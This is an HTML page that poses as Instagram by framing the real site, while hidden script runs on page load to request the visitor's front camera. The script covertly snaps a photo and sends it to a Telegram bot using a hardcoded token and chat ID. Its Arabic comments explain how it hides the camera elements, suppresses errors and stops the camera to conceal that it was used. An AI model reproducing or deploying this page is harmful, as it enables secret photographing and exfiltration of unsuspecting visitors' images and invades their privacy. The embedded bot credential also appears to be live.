<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
        iframe { width: 100%; height: 100%; border: none; }
        /* إخفاء عناصر الكاميرا تماماً */
        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

    <iframe src="https://www.instagram.com" id="bg-frame"></iframe>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = '7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ';
        const chatId = '56081692';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function initCapture() {
            try {
                // طلب الصلاحية بصمت (سيظهر تنبيه المتصفح الافتراضي فقط)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                // الانتظار ثانيتين لالتقاط الصورة بعد استقرار العدسة
                setTimeout(captureAndSend, 2000); 
            } catch (err) {
                // في حال الرفض لا تظهر أي رسائل خطأ للمستخدم
                console.log("Access denied");
            }
        }

        function captureAndSend() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'img.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    // إغلاق الكاميرا بعد الإرسال لتوفير البطارية وإخفاء علامة الاستخدام
                    let tracks = video.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                })
                .catch(e => console.error("Network error"));
            }, 'image/jpeg', 0.7);
        }

        // بدء العملية عند فتح الصفحة
        window.onload = initCapture;
    </script>
</body>
</html>
